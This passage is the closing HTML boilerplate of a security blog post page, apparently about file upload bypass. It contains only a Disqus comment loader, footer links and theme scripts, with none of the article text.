class="btn__text">Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html';
							this.page.identifier = '31'; 
							this.language = 'en_US';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>Sakibul Ali Khan • © 2024 • Offens!ve Blogs</p></div><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://www.youtube.com/@sakibulalikhan" aria-label="Youtube"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#youtube"/></svg></a></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=74fad06980c30243d91d72c7c57fcdb8"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script></body></html>